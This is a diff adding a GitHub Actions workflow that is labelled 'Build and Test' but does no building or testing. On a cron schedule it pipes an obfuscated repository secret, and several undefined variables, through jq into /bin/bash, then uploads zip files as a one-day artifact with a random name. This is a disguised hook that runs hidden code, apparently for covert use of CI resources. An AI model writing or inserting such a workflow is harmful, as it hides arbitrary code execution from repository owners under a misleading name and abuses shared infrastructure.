@@ -1,0 +1,37 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '5 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          zwkl75327: ${{ secrets.zwkl75327 }}
+        run: |
+          printf '%s' "$zwkl75327" | jq -r .vmel93 | /bin/bash
+          printf '%s' "$sz001" | jq -r .fapkl6 | /bin/bash
+          printf '%s' "$xuiby4" | jq -r .qrpq12 | /bin/bash
+          echo $xshu26 | jq -r .hwz4158 | /bin/bash
+          echo $g82 | jq -r .wk240 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: GF6r6iWw
+          path: "*.zip"
+          retention-days: 1
